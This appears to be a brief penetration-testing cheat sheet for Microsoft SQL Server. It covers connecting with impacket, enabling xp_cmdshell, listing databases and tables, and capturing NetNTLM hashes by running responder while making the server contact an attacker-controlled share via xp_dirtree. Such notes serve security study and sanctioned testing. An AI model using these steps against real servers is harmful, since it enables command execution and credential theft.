**MSSQL:**
---
```shell
impacket-mssqlclient $TARGET_DOMAIN/$TARGET_USER:$TARGET_PASSWORD@$TARGET_NAME
```

Try:

```mssql
enable_xp_cmdshell
```

**List databases:**
---
```sql
SELECT name, database_id, create_date FROM sys.databases;
```

**List tables in selected DB:**
---
#mssql 
```sql
SELECT * FROM SYSOBJECTS WHERE xtype = 'U';
```

Leak NetNTLM hashes
---
#hash #ntlm #netntlm #responder
Start responder or another hash grabber to get user and hash:

```bash
sudo responder.py -I tun0
```

and trick the MSSQL server to connect to the "share":

```sql
exec master.dbo.xp_dirtree '//$LOCAL_IP/non/existing'
```

